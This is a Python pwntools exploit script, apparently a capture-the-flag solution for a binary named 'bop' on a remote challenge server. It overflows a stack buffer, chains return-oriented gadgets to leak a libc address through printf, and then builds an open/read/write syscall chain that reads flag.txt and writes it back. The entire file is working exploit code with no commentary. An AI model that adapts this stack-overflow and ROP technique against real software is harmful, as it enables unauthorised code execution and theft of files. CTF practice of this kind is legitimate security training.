from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["mc.ax",30284]
libc=ELF('./libc-2.31.so')
elf = ELF('./bop')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./bop_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)

pop_rdi = p64(0x4013d3)
gets_plt = p64(elf.plt['gets'])
gets_got = p64(elf.got['gets'])
printf_plt = p64(elf.plt['printf'])

ru(b'bop?')
payload = b'a' * (0x20 + 8) + pop_rdi + gets_got + p64(0x40101a) + printf_plt + p64(0x40101a) + p64(0x4012f9)
sl(payload)

leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
pr('leak_addr', leak_addr)
libc_base = leak_addr - libc.sym['gets']
pr('libc_base', libc_base)

pop_rsi = p64(libc_base + 0x2601f)
pop_rdx = p64(libc_base + 0x142c92)
pop_rax = p64(libc_base + 0x36174)
syscall = p64(libc_base + 0x630a9)

open_addr = p64(libc_base + libc.sym['open'])
read_addr = p64(libc_base + libc.sym['read'])
write_addr = p64(libc_base + libc.sym['write'])

ru(b'bop?')
payload = b'a' * (0x20 + 8) + pop_rdi + p64(0) + pop_rsi + p64(0x404100) + pop_rdx + p64(11) + read_addr
payload += pop_rax + p64(2) + pop_rdi + p64(0x404100) + pop_rsi + p64(0) + pop_rdx + p64(0) + p64(0x40101a) + syscall
payload += pop_rdi + p64(3) + pop_rsi + p64(0x404100) + pop_rdx + p64(100) + read_addr
payload += pop_rdi + p64(1) + pop_rsi + p64(0x404100) + pop_rdx + p64(100) + write_addr
sl(payload)

pause()

s(b'./flag.txt\x00')

shell()
